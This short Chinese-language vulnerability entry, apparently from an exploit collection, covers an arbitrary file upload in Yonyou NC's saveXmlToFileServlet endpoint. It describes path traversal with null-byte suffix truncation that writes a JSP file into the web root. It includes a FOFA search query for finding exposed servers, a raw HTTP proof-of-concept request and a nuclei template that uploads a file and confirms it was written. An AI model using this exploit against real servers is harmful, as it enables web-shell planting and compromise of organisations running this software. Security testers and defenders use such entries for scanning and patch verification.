## 用友NC接口saveXmlToFIleServlet存在文件上传

/portal/pt/servlet/saveXmlToFileServlet/doPost接口会保存xml文档到服务器一个路径下，默认会添加.xml后缀，通过Windows的文件名特性可截断.xml文件后缀。再通过目录穿越可上传jsp文件到nc_web目录下。


## fofa
```
title:"YONYOU NC"
```


## poc
```
POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\test9527.jsp%00 HTTP/1.1
Host: xxxxx
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

123

```

## nuclei
```nuclei
id: yonyou-uap-saveXmlToFileServlet-upload-file
info:
  name: yonyou-uap-saveXmlToFileServlet-upload-file
  author: qianbenhyu
  severity: high

http:
  - method: POST
    path:
      - "{{BaseURL}}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{randstr_1}}.jsp%00"
    headers:
      Cookie: LA_K1=langid
      serverEnable: localserver
      Accept-Encoding: gzip, x-gzip, deflate
      Content-Length: 27
      Content-Type: application/octet-stream
      Content-Encoding: UTF_8
      Connection: keep-alive
      User-Agent: Apache-HttpClient/5.2.1 (Java/1.8.0_202)
    body: "{{randstr_2}}"

  - method: GET
    path:
      - "{{BaseURL}}/{{randstr_1}}.jsp"
    matchers:
      - type: word
        words:
          - "{{randstr_2}}"

```
